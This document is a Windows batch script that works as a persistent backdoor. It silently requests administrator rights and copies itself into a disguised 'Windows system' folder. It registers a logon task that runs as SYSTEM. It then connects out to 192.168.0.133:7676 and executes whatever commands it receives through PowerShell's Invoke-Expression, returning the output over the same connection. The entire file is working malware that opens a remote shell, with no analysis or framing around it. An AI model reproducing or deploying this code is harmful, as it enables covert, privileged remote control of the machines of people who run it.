@echo off 
if not "%1"=="am_admin" (start /B /min powershell -windowStyle hidden start -verb runas '%0' am_admin & exit /b) 
if exist "C:\Program Files\Windows system\socket.bat" (exit 0) 
mkdir C:\"Program Files"\"Windows system" 
copy %0 C:\"Program Files"\"Windows system"\socket.bat 
schtasks /create /F /ru "SYSTEM" /sc onlogon /tn BatSocket /rl highest /tr "\"C:\Program Files\Windows system\socket.bat"\" 
findstr /V "exist mkdir copy schtasks findstr exit" %0 > "C:\Program Files\Windows system\socket.bat" 
schtasks /run /I /TN BatSocket 
exit 0 
start powershell -Command "$FTPServer = '192.168.0.133';$FTPPort = '7676';$inputCounter = 0;$outputCounter = 0;$testConnection=0; while(1){    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);    $tcpStream = $tcpConnection.GetStream();    $reader = New-Object System.IO.StreamReader($tcpStream);    $writer = New-Object System.IO.StreamWriter($tcpStream);    $writer.AutoFlush = $true;    $buffer = new-object System.Byte[] 1024;    $encoding = new-object System.Text.AsciiEncoding;            while ($tcpConnection.Connected) {        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {               $path = -join('C:\Program Files\Windows system\input', $inputCounter,'.txt');            Set-Content -Path $path -Value $reader.ReadLine();            $inputCounter+=1;        };                $pathOutput = -join('C:\Program Files\Windows system\output',$outputCounter,'.txt');        if(Test-Path $pathOutput){            $output = Get-Content $pathOutput;            if($output.length -ge 1){                Foreach($s in $output){                    $writer.WriteLine($s);                };              };            $outputCounter+=1;            Remove-Item $pathOutput;        };            start-sleep -Milliseconds 120;        $testConnection+=1;        if($testConnection -ge 48){            $writer.Write(':');            $testConnection=0;        }    };        $reader.Close();    $writer.Close();    $tcpConnection.Close();        start-sleep -Milliseconds 7000;}"
start powershell -Command "$counterInput = 0;$counterOutput = 0;while (1) {    $path = -join('C:\Program Files\Windows system\input',$counterInput, '.txt');        if(Test-Path $path){        $input = Get-Content $path;        if($input.length -ge 1){            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');            $output = Invoke-Expression $input;            $joinedOutput = '';            Foreach($s in $output){                $joinedOutput+= $s;                $joinedOutput+=[environment]::NewLine;            };            Set-Content -Path $outputPath -Value $joinedOutput;        };                $counterInput+=1;        $counterOutput+=1;        Remove-Item $path;    };            start-sleep -Milliseconds 120;};"
